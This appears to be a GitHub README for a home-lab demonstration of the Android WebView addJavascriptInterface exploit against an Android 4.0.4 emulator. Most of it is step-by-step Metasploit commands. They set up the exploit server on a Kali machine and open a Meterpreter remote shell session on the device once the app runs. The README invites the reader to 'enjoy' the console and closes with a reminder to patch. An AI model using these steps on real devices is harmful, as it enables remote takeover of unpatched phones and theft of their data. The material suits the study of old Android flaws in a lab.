# WebView exploit

Based on the following:

https://www.google.ro/search?q=webview+android+exploit&rlz=1C1CHBF_enRO790RO790&oq=webview+android+exploit&aqs=chrome..69i57j69i61l3j0l2.3695j0j7&sourceid=chrome&ie=UTF-8

This repo contains:
- Readme with topology and kali commands used in msfconsole
- the code from the apk in the terminal device

Note: Tested it on a 4.0.4 Android device. I also tested on 4.1 (with the same code as added here), but it seems that the exploit did not work anymore on it.

1. Topology
Android 4.0.4 (in AVD) <--------> Windows 10 HOST <---Vbox vmnet 0 bridge connection----> Kali VM

2. To start the server on the kali use:  
$ msfconsole  
msf > use exploit/android/browser/webview_addjavascriptinterface  
msf exploit(webview_addjavascriptinterface) > set LHOST $IP_OF_THE_KALI_MACHINE  
msf exploit(webview_addjavascriptinterface) > set uripath $PATH_TO_USE  
msf exploit(webview_addjavascriptinterface) > set port 80 (can also change it if you want)  
msf exploit(webview_addjavascriptinterface) > exploit  

now there should appear the message: "Server started"

3. Go now to the android device and run the app

4. In msfconsole there should appear now: "Meterpreter session X (starts from 1) opened"
msf exploit(webview_addjavascriptinterface) > sesion -i X (the id of the session started)

5. Access the console and enjoy !

6. Be sure to update the device to a patched version in the end!
